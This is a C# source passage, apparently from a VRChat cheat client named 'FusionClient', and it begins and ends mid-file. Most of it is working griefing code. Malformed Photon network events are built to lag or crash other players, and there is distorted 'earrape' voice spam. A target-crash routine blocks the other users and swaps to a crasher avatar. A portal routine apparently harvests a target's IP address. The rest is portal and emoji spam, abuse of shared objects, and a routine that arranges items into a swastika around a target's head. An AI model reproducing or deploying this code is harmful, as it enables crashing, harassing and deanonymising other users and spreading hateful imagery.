                    Logs.Hud("Sorry This Only Works In SDK2 World's With SDK2 PENS");
                }
            }
            catch
            {

            }
        }

        #endregion Pen Crash

        #region Windows Sound

        public static bool WindowsSound;

        public static void OnUpdate()
        {
            try
            {
                if (WindowsSound)
                {
                    if (VRCPlayer.field_Internal_Static_VRCPlayer_0 != null)
                    {
                        GameObject gameObject = VRCPlayer.field_Internal_Static_VRCPlayer_0.gameObject;
                        GameObject targetObject = Networking.Instantiate(VRC_EventHandler.VrcBroadcastType.Always, "Portals/PortalInternalDynamic", gameObject.transform.position + new Vector3(0f, 0f, 0f), new Quaternion(4f, 4f, 0f, 1f));
                        Il2CppSystem.Object[] array = new Il2CppSystem.Object[3];
                        array[0] = "\a \r \nFusionClient on top.\n\nFusionClient on top.\n\nFusionClient on top.\n\nFusionClient on top.\n\nFusionClient on top.\n\nFusionClient on top.\n\nFusionClient on top.\n\nFusionClient on top.\n\nFusionClient on top.\n\nFusionClient on top.\n\nFusionClient on top.\n\nFusionClient on top.\n\nFusionClient on top.\n";
                        array[1] = "\r \nFusionClient on top.\n";
                        Il2CppSystem.Object[] array2 = array;
                        Il2CppSystem.Int32 @int = default(Il2CppSystem.Int32);
                        @int.m_value = 0;
                        array2[2] = @int.BoxIl2CppObject();
                        Networking.RPC(RPC.Destination.AllBufferOne, targetObject, "ConfigurePortal", array2);
                    }
                }
            }
            catch
            {
            }
        }

        #endregion Windows Sound

        #region Swastika

        internal static float rotatestate;
        internal static Vector3 PositionToGoTo;
        internal static float SwastikaSize = 45f;
        internal static bool SwastikaBool = false;
        internal static bool SwastikaFolowBool = false;

        public static void Swastika()
        {
            var il2CppArrayBase = ModulesFunctions.AllPickups;
            if (rotatestate >= 360f)
            {
                rotatestate = Time.deltaTime;
            }
            else
            {
                rotatestate += Time.deltaTime;
            }
            short num = System.Convert.ToInt16(il2CppArrayBase.Count / 8);
            float num2 = 0f;
            float num3 = 0f;
            float num4 = (float)il2CppArrayBase.Count / SwastikaSize;
            for (int i = 0; i < il2CppArrayBase.Count; i++)
            {
                VRC_Pickup vrc_Pickup = il2CppArrayBase[i];
                MiscUtils.TakeOwnershipIfNecessary(vrc_Pickup.gameObject);
                    if (num2 >= (float)num)
                    {
                        if (num3 < 7f)
                        {
                            num3 += 1f;
                            num2 = 0f;
                        }
                        else
                        {
                            num3 = 0f;
                            num2 = 0f;
                        }
                    }
                if (num3 == 0f)
                {
                    vrc_Pickup.transform.position = PositionToGoTo + new Vector3(0f, num4 * (num2 / (float)num), 0f);
                }
                else if (num3 == 1f)
                {
                    vrc_Pickup.transform.position = PositionToGoTo + new Vector3(0f, (0f - num4) * (num2 / (float)num), 0f);
                }
                else if (num3 == 2f)
                {
                    vrc_Pickup.transform.position = PositionToGoTo + new Vector3((0f - Mathf.Cos(rotatestate)) * num4 * (num2 / (float)num), 0f, Mathf.Sin(rotatestate) * num4 * (num2 / (float)num));
                }
                else if (num3 == 3f)
                {
                    vrc_Pickup.transform.position = PositionToGoTo + new Vector3((0f - Mathf.Cos(rotatestate + 179f)) * num4 * (num2 / (float)num), 0f, Mathf.Sin(rotatestate + 179f) * num4 * (num2 / (float)num));
                }
                else if (num3 == 4f)
                {
                    vrc_Pickup.transform.position = PositionToGoTo + new Vector3((0f - Mathf.Cos(rotatestate + 179f)) * num4, num4 * (num2 / (float)num), Mathf.Sin(rotatestate + 179f) * num4);
                }
                else if (num3 == 5f)
                {
                    vrc_Pickup.transform.position = PositionToGoTo + new Vector3((0f - Mathf.Cos(rotatestate)) * num4, (0f - num4) * (num2 / (float)num), Mathf.Sin(rotatestate) * num4);
                }
                else if (num3 == 6f)
                {
                    vrc_Pickup.transform.position = PositionToGoTo + new Vector3((0f - Mathf.Cos(rotatestate + 179f)) * num4 * (num2 / (float)num), 0f - num4, Mathf.Sin(rotatestate + 179f) * (num4 * (num2 / (float)num)));
                }
                else
                {
                    vrc_Pickup.transform.position = PositionToGoTo + new Vector3((0f - Mathf.Cos(rotatestate)) * num4 * (num2 / (float)num), num4, Mathf.Sin(rotatestate) * num4 * (num2 / (float)num));
                }
                vrc_Pickup.transform.rotation = Quaternion.Euler(0f, rotatestate * -90f, 0f);
                if (vrc_Pickup.GetComponent<Rigidbody>().velocity != Vector3.zero && vrc_Pickup.GetComponent<Rigidbody>())
                {
                    vrc_Pickup.GetComponent<Rigidbody>().velocity = Vector3.zero;
                }
                num2 += 1f;
            }
        }

        internal static IEnumerator SwastikaFolow()
        {
            while (SwastikaFolowBool)
            {
                try
                {
                    ModulesFunctions.PositionToGoTo = UI.Target.field_Private_VRCPlayerApi_0.GetBonePosition(HumanBodyBones.Head);
                }
                catch { }
                yield return new WaitForSecondsRealtime(0.2f);
            }
            yield break;
        }

        #endregion Swastika

        #region Event 9

        public static bool Event9 = false;

        internal static IEnumerator Event9Exploit()
        {
            while (Event9)
            {
                try
                {
                    if (VRCPlayer.field_Internal_Static_VRCPlayer_0 == null)
                    {
                        Event9 = false;
                    }
                    for (int i = 0; i < 80; i++)
                    {
                        byte[] LagData = new byte[8];
                        int idfirst2 = int.Parse(PlayerUtils.GetCurrentUser().GetVRCPlayerApi().playerId + "00001");
                        byte[] IDOut2 = BitConverter.GetBytes(idfirst2);
                        Buffer.BlockCopy(IDOut2, 0, LagData, 0, 4);
                        MiscUtils.OpRaiseEvent(9, LagData, new RaiseEventOptions
                        {
                            field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
                            field_Public_EventCaching_0 = EventCaching.DoNotCache
                        }, default(SendOptions));
                    }
                }
                catch { }
                yield return new WaitForSecondsRealtime(0.1f);
            }
            yield break;
        }

        #endregion

        #region Event 8

        public static bool Event8 = false;

        internal static IEnumerator Event8Exploit()
        {
            while (Event8)
            {
                try
                {
                    if (VRCPlayer.field_Internal_Static_VRCPlayer_0 == null)
                    {
                        Event8 = false;
                    }
                    //Get all the player interests
                    int[] actorIdList = new int[PlayerUtils.GetAllPlayersToList().Count];
                    for (int i = 0; i < PlayerUtils.GetAllPlayersToList().Count; i++)
                    {
                        actorIdList[i] = PlayerUtils.GetAllPlayersToList().ElementAt(i).field_Private_VRCPlayerApi_0.playerId;
                    }
                    //Now create the array
                    byte[] byteArray = new byte[actorIdList.Length * 6];
                    for (int i = 0; i < actorIdList.Length; i++)
                    {
                        int actr = actorIdList[i];
                        int position = i * 6;
                        byte[] actorIdBytes = BitConverter.GetBytes(actr);
                        Buffer.BlockCopy(actorIdBytes, 0, byteArray, position, 4);
                        byteArray[position + 4] = 0x00;
                        byteArray[position + 5] = 0xFF;
                    }
                    MiscUtils.OpRaiseEvent(8, byteArray, new RaiseEventOptions
                    {
                        field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
                        field_Public_EventCaching_0 = EventCaching.DoNotCache
                    }, default);
                }
                catch { }
                yield return new WaitForSecondsRealtime(0.1f);
            }
        }

        #endregion Event 9

        #region Event 7

        public static bool Event7 = false;

        internal static IEnumerator Event7Exploit()
        {
            while (Event7)
            {
                try
                {
                    if (VRCPlayer.field_Internal_Static_VRCPlayer_0 == null)
                    {
                        Event7 = false;
                    }
                    byte[] LagData = new byte[] { 161, 134, 1, 0, 61, 174, 253, 53, 5, 4, 2, 0, 1, 4, 1, 4, 57, 39, 20, 1, 17, 9, 162, 43, 64, 160, 72, 92, 188, 129, 64, 8, 191, 255, 185, 255, 95, 95, 19, 138, 6, 27, 64, 194, 255, 127, 63, 219, 11, 136, 64, 0, 86, 2, 96, 37, 23, 0, 7, 7, 116, 0, 11, 10, 1, 6, 5, 4, 0, 8, 0, 0, 7, 11, 128, 1, 0, 255, 3, 17, 3, 0, 0, 67, 24, 196, 63, 114, 38, 251, 245, 247, 159, 255, 119, 145, 37, 57, 178, 35, 61, 42, 230, 153, 253, 149, 213, 180, 146, 18, 6, 145, 0, 0, 0, 0, 0, 0, 159, 46, 15, 37, 200, 29, 179, 37, 81, 165, 92, 161, 74, 57, 119, 40, 223, 166, 36, 59, 12, 47, 247, 177, 37, 176, 0, 0, 143, 57, 237, 42, 61, 165, 130, 59, 148, 40, 196, 171, 58, 178, 0, 0, 242, 48, 94, 182, 106, 184, 184, 45, 225, 175, 21, 182, 5, 50, 5, 180, 251, 165, 29, 52, 108, 186, 90, 184, 118, 46, 144, 173, 94, 182, 234, 48, 68, 184, 217, 168 };
                    int idfirst2 = int.Parse(VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_VRCPlayerApi_0.playerId + "00001");
                    byte[] IDOut2 = BitConverter.GetBytes(idfirst2);
                    Buffer.BlockCopy(IDOut2, 0, LagData, 0, 4);
                    MiscUtils.OpRaiseEvent(7, LagData, new Photon.Realtime.RaiseEventOptions
                    {
                        field_Public_ReceiverGroup_0 = Photon.Realtime.ReceiverGroup.Others,
                        field_Public_EventCaching_0 = Photon.Realtime.EventCaching.DoNotCache
                    }, SendOptions.SendReliable);
                }
                catch { }
                yield return new WaitForSecondsRealtime(0.1f);
            }
        }

        #endregion

        #region Event 6

        public static bool Event6 = false;

        //public static readonly byte[] LagData = new byte[] {106,191,218,132,88,12,0,0,0,7,0,58,118,213,byte.MaxValue,byte.MaxValue,50,47,14,0,byte.MaxValue,0,0,0,0,9,0,0,0,13,0,69,110,97,98,108,101,77,101,115,104,82,80,67,0,0,0,0,0,0,0,2};
        private static readonly byte[] LagData = new byte[]
{
            106,
            191,
            218,
            132,
            88,
            12,
            0,
            0,
            0,
            7,
            0,
            58,
            118,
            213,
            byte.MaxValue,
            byte.MaxValue,
            50,
            47,
            14,
            0,
            byte.MaxValue,
            0,
            0,
            0,
            0,
            9,
            0,
            0,
            0,
            13,
            0,
            69,
            110,
            97,
            98,
            108,
            101,
            77,
            101,
            115,
            104,
            82,
            80,
            67,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            2
};

        public static IEnumerator StartE6()
        {
            while (Event6)
            {
                for (int i = 0; i < 425; i++)
                {
                    MiscUtils.OpRaiseEvent(6, LagData, new RaiseEventOptions
                    {
                        field_Public_ReceiverGroup_0 = 0,
                        field_Public_EventCaching_0 = 0
                    }, default(SendOptions));
                }
                yield return new WaitForSeconds(1f);
            }
        }

        #endregion

        #region BrokenUspeek

        internal static bool earrapeExploitRunning;

        internal static IEnumerator EarrapeExploit()
        {
            while (earrapeExploitRunning)
            {
                try
                {
                    if (VRCPlayer.field_Internal_Static_VRCPlayer_0 == null)
                    {
                        earrapeExploitRunning = false;
                    }
                    byte[] voiceData = new byte[]
                    {
                        0, 0, 0, 0, //Actor Number ID
                        0, 0, 0, 0, //Photon Server Time
                        187, 134, 59, 0,
                        248, 125, 232, 192, 92, 160, 82,
                        254, 48, 228, 30, 187, 149, 196, 177,
                        215, 140, 223, 127, 209, 66, 60, 0,
                        226, 53, 180, 176, 97, 104, 4, 248, 238,
                        195, 134, 44, 185, 182, 68, 94, 114, 205,
                        181, 150, 56, 232, 126, 247, 155, 123, 172,
                        108, 98, 80, 56, 113, 89, 160, 134, 221
                    };
                    Buffer.BlockCopy(BitConverter.GetBytes(VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_VRCPlayerApi_0.playerId), 0, voiceData, 0, 4);
                    //Buffer.BlockCopy(BitConverter.GetBytes(PhotonNetwork.field_Public_Static_LoadBalancingClient_0.field_Private_LoadBalancingPeer_0.ServerTimeInMilliSeconds), 0, voiceData, 4, 4);
                    //Buffer.BlockCopy(BitConverter.GetBytes(PhotonNetwork.field_Public_Static_LoadBalancingClient_0.field_Private_PhotonPeerPublicPo1PaTyUnique_0.ServerTimeInMilliSeconds), 0, voiceData, 4, 4);
                    Buffer.BlockCopy(BitConverter.GetBytes(PhotonNetwork.field_Public_Static_LoadBalancingClient_0.field_Private_LoadBalancingPeer_0.ServerTimeInMilliSeconds), 0, voiceData, 4, 4);
                    MiscUtils.OpRaiseEvent(1, voiceData, new RaiseEventOptions
                    {
                        field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
                        field_Public_EventCaching_0 = EventCaching.DoNotCache
                    }, default);
                }
                catch { }
                yield return new WaitForSecondsRealtime(0.03f);
            }
        }

        #endregion

        #region Serialization

        public static bool Serialization = false;
        public static GameObject SerializationClone;

        public static void SerializationM(bool state)
        {
            if (state)
            {
                var pos = PlayerUtils.GetCurrentUser().transform.position;
                var rot = PlayerUtils.GetCurrentUser().transform.rotation;
                Serialization = true;
                SerializationClone = UnityEngine.Object.Instantiate(PlayerUtils.GetCurrentUser().prop_VRCAvatarManager_0.prop_GameObject_0, null, true);
                Animator component = SerializationClone.GetComponent<Animator>();
                if (component != null && component.isHuman)
                {
                    Transform boneTransform = component.GetBoneTransform(HumanBodyBones.Head);
                    if (boneTransform != null) boneTransform.localScale = Vector3.one;
                }
                SerializationClone.name = "Serialize Clone";
                component.enabled = false;
                SerializationClone.GetComponent<FullBodyBipedIK>().enabled = false;
                SerializationClone.GetComponent<LimbIK>().enabled = false;
                SerializationClone.GetComponent<VRIK>().enabled = false;
                SerializationClone.GetComponent<LookTargetController>().enabled = false;
                SerializationClone.transform.position = pos;
                SerializationClone.transform.rotation = rot;
            }
            else
            {
                Serialization = false;
                UnityEngine.Object.Destroy(SerializationClone);
            }
        }
        
        public static bool Blink = false;

        internal static IEnumerator BlinkMeth()
        {
            while (Blink)
            {
                try
                {
                    Serialization = false;
                }
                catch { }
                yield return new WaitForSecondsRealtime(0.5f);
                    Serialization = true;
                yield return new WaitForSecondsRealtime(0.5f);
            }
            yield break;
        }

        #endregion Serialization

        #region Item Lock

        public static bool ItemLockBool = false;

        public static IEnumerator ItemLockLoop()
        {
            while (true)
            {
                yield return new WaitForSeconds(0.3f);
                try
                {
                    if (ItemLockBool)
                    {
                        ItemLock();
                    }
                }
                catch { }
            }
        }

        public static void ItemLock()
        {
            VRC_Pickup[] array = WorldUtils.GetActivePickups();
            for (int i = 0; i < array.Length; i++)
            {
                VRC_Pickup p = array[i];
                if (Networking.GetOwner(p.gameObject) != Networking.LocalPlayer)
                {
                    Networking.SetOwner(Networking.LocalPlayer, p.gameObject);
                    p.DisallowTheft = true;
                }
            }
        }

        #endregion Item Lock

        #region Spam Udon Events

        internal static bool killudon = false;

        internal static IEnumerator KillUdon()
        {
            while (killudon)
            {
                var udonevents = WorldUtils.Get_UdonBehaviours();
                if (udonevents == null) { yield return null; }
                if (udonevents.Count() == 0) { yield return null; }
                foreach (var action in udonevents)
                {
                    foreach (var subaction in action._eventTable)
                    {
                        if (subaction.key.StartsWith("_"))
                        {
                            action.SendCustomEvent(subaction.Key);
                        }
                        else
                        {
                            action.SendCustomNetworkEvent(NetworkEventTarget.All, subaction.Key);
                        }
                        yield return new WaitForSeconds(0.1f);
                    }
                }
                yield return null;
            }
        }

        #endregion Spam Udon Events

        #region Advert Portal

        internal static void SetPortalTime(float time)
        {
            foreach (PortalInternal portal in Resources.FindObjectsOfTypeAll<PortalInternal>())
            {
                MiscUtils.getOwnerOfGameObject(portal.gameObject);
                portal.field_Private_Single_1 = (time - 30); //Remember to offset by 30 to get the correct number
            }
        }

        public static void CoolThing()
        {
            var place = "wrld_81b53bee-b993-4bc7-ac8b-dc5206f78548:\b☁FusionClient☁\0~region(jp)";
            MiscUtils.DropPortalInfPlayers(place);
            SetPortalTime(float.MinValue);
        }

        #endregion Advert Portal

        #region Crasher Shit

        internal static bool AviCrashStart;

        public static void WorldClap(string AvatarID, int SecondsToWait)
        {
            PreviousAvatar = VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_ApiAvatar_0.id;
            ModulesFunctions.ChangeAvatar(AvatarID);
            AviCrashStart = true;
            PlayerUtils.GetCurrentUser().GetAvatar().gameObject.SetActive(false);
            MelonCoroutines.Start(WaitSeconds());

            IEnumerator WaitSeconds()
            {
                yield return new WaitForSeconds(SecondsToWait);
                Logs.Hud("Switching Back To Your Old Avi");
                AviCrashStart = false;
                ModulesFunctions.ChangeAvatar("avtr_c38a1615-5bf5-42b4-84eb-a8b6c37cbd11");
                yield return new WaitForSeconds(2.5f);
                ModulesFunctions.ChangeAvatar("avtr_c38a1615-5bf5-42b4-84eb-a8b6c37cbd11");
                yield return new WaitForSeconds(2.5f);
                while (VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_ApiAvatar_0.id != PreviousAvatar)
                {
                    ModulesFunctions.ChangeAvatar(PreviousAvatar);
                    PlayerUtils.GetCurrentUser().GetAvatar().gameObject.SetActive(true);
                    yield return new WaitForSeconds(0.5f);
                }
            }
        }

        #endregion Crasher Shit

        #region Target Crash

        public static List<string> UserID = new List<string>();
        public static string PreviousAvatar;

        public static IEnumerator TargetCrash(VRC.Player Target)
        {
            Logs.Hud("Blocking players...");

            foreach (var Player in PlayerUtils.GetPlayers())
            {
                var UserPage = GameObject.Find("Screens").transform.Find("UserInfo").GetComponent<VRC.UI.PageUserInfo>();
                UserPage.field_Private_APIUser_0 = Player.field_Private_APIUser_0;
                if (IsBlockedEitherWay(UserPage.field_Private_APIUser_0.id) == false && UserPage.field_Private_APIUser_0.id != APIUser.CurrentUser.id && UserPage.field_Private_APIUser_0.id != Target.GetAPIUser().id) UserPage.ToggleBlock();
            }

            yield return new WaitForSeconds(6);
            PreviousAvatar = VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_ApiAvatar_0.id;

            if (Target.field_Private_APIUser_0.IsOnMobile)
            {
                ModulesFunctions.WorldClap(Config.Main.QuestCrashID, 10);
            }
            else
            {
                ModulesFunctions.WorldClap(Config.Main.AviClapID, 10);
            }

            yield return new WaitForSeconds(16);

            Logs.Hud("Unblocking players...");

            foreach (var Player in PlayerUtils.GetPlayers())
            {
                var UserPage = GameObject.Find("Screens").transform.Find("UserInfo").GetComponent<VRC.UI.PageUserInfo>();
                UserPage.field_Private_APIUser_0 = Player.field_Private_APIUser_0;
                if (IsBlockedEitherWay(UserPage.field_Private_APIUser_0.id) && UserPage.field_Private_APIUser_0.id != APIUser.CurrentUser.id && UserPage.field_Private_APIUser_0.id != Target.GetAPIUser().id) UserPage.ToggleBlock();
            }
        }

        public static bool IsBlockedEitherWay(string userId)
        {
            var moderationManager = ModerationManager.prop_ModerationManager_0;
            if (moderationManager == null) return false;
            if (APIUser.CurrentUser.id == userId) return false;

            var moderationsDict = ModerationManager.prop_ModerationManager_0.field_Private_Dictionary_2_String_List_1_ApiPlayerModeration_0;
            if (!moderationsDict.ContainsKey(userId)) return false;

            foreach (var playerModeration in moderationsDict[userId])
            {
                if (playerModeration != null && playerModeration.moderationType == ApiPlayerModeration.ModerationType.Block) return true;
            }

            return false;

        }

        #endregion

        #region ItemLagger

        internal static bool ItemLaggerBool;

        public static IEnumerator ItemLagger()
        {
            ItemLaggerBool = true;
            while (ItemLaggerBool && RoomManager.field_Internal_Static_ApiWorld_0 != null)
            {
                try
                {
                    VRCPlayer component_ = null;
                    foreach (Player player in PlayerUtils.GetPlayers())
                    {
                        component_ = player._vrcplayer;
                    }
                    ForwardDirection(component_);
                }
                catch
                {
                }
                yield return new WaitForSeconds(1f);
                ModulesFunctions.TakeOwnerShip(new Vector3(2.1474836E+09f, 2.1474836E+09f, 2.1474836E+09f));
                yield return new WaitForSeconds(1.5f);
            }
            yield break;
        }

        public static void ForwardDirection(UnityEngine.Component component_0)
        {
            foreach (VRC_Pickup vrc_Pickup in Resources.FindObjectsOfTypeAll<VRC_Pickup>())
            {
                Networking.LocalPlayer.TakeOwnership(vrc_Pickup.gameObject);
                vrc_Pickup.transform.position = component_0.transform.Find("ForwardDirection/Avatar").GetComponent<Animator>().GetBoneTransform((HumanBodyBones)10).FindChild("HmdPivot").transform.position;
            }
        }

        public static void TakeOwnerShip(Vector3 vector3_0)
        {
            foreach (VRC_Pickup vrc_Pickup in Resources.FindObjectsOfTypeAll<VRC_Pickup>())
            {
                Networking.LocalPlayer.TakeOwnership(vrc_Pickup.gameObject);
                vrc_Pickup.transform.position = vector3_0;
            }
        }

        #endregion

        #region PortalAnnoy

        internal static bool PortalSpam;

        internal static IEnumerator PortalAnnoy(Player player)
        {
            PortalSpam = true;
            for (; ; )
            {
                while (RoomManager.field_Internal_Static_ApiWorld_0 == null) yield break;
                while (player.field_Private_Player_0 == null) yield break;
                MiscUtils.DropPortalInfPlayers("wrld_81b53bee-b993-4bc7-ac8b-dc5206f78548", $"\b\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\0~region(jp)", 0, player.transform.position + player.transform.forward * 2.1f, player.transform.rotation);
                SetPortalTime(float.MinValue);
                if (!PortalSpam)
                {
                    yield break;
                }
                yield return new WaitForSeconds(5.2f);
            }
        }

        #endregion

        #region IpGrabber

        internal static bool IpGrabber;

        internal static IEnumerator IpGrabberPortal(Player player)
        {
            IpGrabber = true;
            for (; ; )
            {
                while (RoomManager.field_Internal_Static_ApiWorld_0 == null) yield break;
                while (player.field_Private_Player_0 == null) yield break;
                MiscUtils.DropPortal("wrld_09d08b37-57be-438e-b529-40d6870f58e3", $"8813", 11, player.transform.position + player.transform.forward * 2.1f, player.transform.rotation);
                if (!IpGrabber)
                {
                    yield break;
                }
                yield return new WaitForSeconds(8.2f);
            }
        }

        #endregion

        #region Emoji Spam

        internal static bool EmojiSpamBool = false;
        internal static int CurrentSelectedEmoji;

        internal static IEnumerator EmojiSpam()
        {
            while (EmojiSpamBool)
            {
                try
                {
                    if (VRCPlayer.field_Internal_Static_VRCPlayer_0 == null)
                    {
                        EmojiSpamBool = false;
                    }
                    if (WorldUtils.IsInWorld())
                    {
                        CurrentSelectedEmoji = MiscUtils.random.Next(0, MiscUtils.EmojiType.Count);
                        MiscUtils.EmojiRPC(CurrentSelectedEmoji);
                    }
                }
                catch { }
                yield return new WaitForSecondsRealtime(2f);
            }
            yield break;
        }

        #endregion

        #region FreeFall Pickup

        internal static bool FreeFallBool;

        public static List<VRC_Pickup> AllPickups = new List<VRC_Pickup>();
        public static List<VRCPickup> AllUdonPickups = new List<VRCPickup>();
        public static List<VRC_Trigger> AllTriggers = new List<VRC_Trigger>();
        public static List<VRCSDK2.VRC_ObjectSync> AllSyncPickups = new List<VRCSDK2.VRC_ObjectSync>();

        internal static IEnumerator FreeFallLoop()
        {
            while (FreeFallBool)
            {
                while (RoomManager.field_Internal_Static_ApiWorld_0 == null) yield break;
                while (PlayerUtils.GetCurrentUser() == null) yield break;

                for (int I = 0; I < ModulesFunctions.AllPickups.Count; I++)
                {
                    var Pickup = ModulesFunctions.AllPickups[I];
                    MelonCoroutines.Start(ModulesFunctions.FreeFallPickup(Pickup, 4));
                }

                for (int I = 0; I < ModulesFunctions.AllUdonPickups.Count; I++)
                {
                    var Pickup = ModulesFunctions.AllUdonPickups[I];
                    MelonCoroutines.Start(ModulesFunctions.FreeFallPickup(Pickup, 4));
                }

                for (int I = 0; I < ModulesFunctions.AllSyncPickups.Count; I++)
                {
                    var Pickup = ModulesFunctions.AllSyncPickups[I];
                    Pickup.GetComponent<Rigidbody>().useGravity = true;
                    Pickup.isKinematic = false;
                    Pickup.useGravity = true;
                    MelonCoroutines.Start(ModulesFunctions.FreeFallPickup(Pickup, 4));
                }

                if (!FreeFallBool)
                {
                    yield break;
                }
                yield return new WaitForSecondsRealtime(5);
                ModulesFunctions.RespawnPickups();
                yield return new WaitForSecondsRealtime(5);
            }
        }

        public static IEnumerator FreeFallPickup(VRCPickup Pickup, int HowMuchTime)
        {
            MiscUtils.TakeOwnershipIfNecessary(Pickup.gameObject);
            Pickup.GetComponent<Rigidbody>().mass = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().useGravity = true;
            Pickup.GetComponent<Rigidbody>().velocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
            Pickup.GetComponent<Rigidbody>().maxAngularVelocity = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().maxDepenetrationVelocity = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().isKinematic = false;
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Acceleration);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Force);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Impulse);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.VelocityChange);
            Pickup.GetComponent<Rigidbody>().angularVelocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);

            var TimeToStop = Time.time + HowMuchTime;
            while (Time.time < TimeToStop)
            {
                Pickup.gameObject.transform.position = new Vector3(0, 0, 0);
                yield return new WaitForSeconds(1f);
                Pickup.gameObject.transform.position = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
                yield return new WaitForSeconds(2);
            }
            Pickup.gameObject.transform.position = new Vector3(0, 0, 0);
            yield break;
        }

        public static IEnumerator FreeFallPickup(VRC_Pickup Pickup, int HowMuchTime)
        {
            MiscUtils.TakeOwnershipIfNecessary(Pickup.gameObject);
            Pickup.GetComponent<Rigidbody>().mass = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().useGravity = true;
            Pickup.GetComponent<Rigidbody>().velocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
            Pickup.GetComponent<Rigidbody>().maxAngularVelocity = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().maxDepenetrationVelocity = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().isKinematic = false;
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Acceleration);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Force);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Impulse);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.VelocityChange);
            Pickup.GetComponent<Rigidbody>().angularVelocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);

            var TimeToStop = Time.time + HowMuchTime;
            while (Time.time < TimeToStop)
            {
                Pickup.gameObject.transform.position = new Vector3(0, 0, 0);
                yield return new WaitForSeconds(1f);
                Pickup.gameObject.transform.position = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
                yield return new WaitForSeconds(2);
            }
            Pickup.gameObject.transform.position = new Vector3(0, 0, 0);
            yield break;
        }

        public static IEnumerator FreeFallPickup(VRCSDK2.VRC_ObjectSync Pickup, int HowMuchTime)
        {
            MiscUtils.TakeOwnershipIfNecessary(Pickup.gameObject);
            Pickup.GetComponent<Rigidbody>().mass = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().useGravity = true;
            Pickup.GetComponent<Rigidbody>().velocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
            Pickup.GetComponent<Rigidbody>().maxAngularVelocity = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().maxDepenetrationVelocity = int.MaxValue;
            Pickup.GetComponent<Rigidbody>().isKinematic = false;
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Acceleration);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Force);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.Impulse);
            Pickup.GetComponent<Rigidbody>().AddForce(new Vector3(int.MaxValue, int.MaxValue, int.MaxValue), ForceMode.VelocityChange);
            Pickup.GetComponent<Rigidbody>().angularVelocity = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);

            var TimeToStop = Time.time + HowMuchTime;
            while (Time.time < TimeToStop)
            {
                Pickup.gameObject.transform.position = new Vector3(0, 0, 0);
                yield return new WaitForSeconds(1f);
                Pickup.gameObject.transform.position = new Vector3(int.MaxValue, int.MaxValue, int.MaxValue);
                yield return new WaitForSeconds(2);
            }
            Pickup.gameObject.transform.position = new Vector3(0, 0, 0);
            yield break;
        }

        #endregion

        #region Spam Mirrors
        public static List<UdonBehaviour> UdonBehaviours = new();
        internal static bool SpamMirrorsBool = false;

        public static IEnumerator SpamMirrors()
        {
            while (SpamMirrorsBool)
            {
                var udonevents = UdonBehaviours;
                if (udonevents == null) { yield return null; }
                if (udonevents.Count() == 0) { yield return null; }
                foreach (VRC_Trigger Trigger in AllTriggers)
                {
                    if (Trigger.name.ToLower().Contains("mirror") || Trigger.transform.parent.name.ToLower().Contains("mirror") || Trigger.transform.name.Contains("MirrorToggle") || Trigger.transform.name.Contains("Normal Mirror"))
                    {
                        MiscUtils.TakeOwnershipIfNecessary(Trigger.gameObject);
                        Trigger.Interact();
                    }
                }
                yield return new WaitForSecondsRealtime(0.5f);
                foreach (var action in udonevents)
                {
                    foreach (var subaction in action._eventTable)
                    {
                        if (subaction.key.StartsWith("Toggle"))
                        {
                            action.SendCustomNetworkEvent(NetworkEventTarget.All, subaction.Key);
                        }
                    }
                }
                yield return new WaitForSecondsRealtime(0.5f);
                foreach (var action in udonevents)
                {
                    foreach (var subaction in action._eventTable)
                    {
                        if (subaction.key.StartsWith("HQon"))
                        {
                            action.SendCustomNetworkEvent(NetworkEventTarget.All, subaction.Key);
                        }
                    }
                }
                yield return new WaitForSecondsRealtime(0.5f);
                foreach (var action in udonevents)
                {
                    foreach (var subaction in action._eventTable)
                    {
                        if (subaction.key.StartsWith("LQonbutton"))
                        {
                            action.SendCustomNetworkEvent(NetworkEventTarget.All, subaction.Key);
                        }
                    }
                }
                yield return new WaitForSecondsRealtime(0.5f);
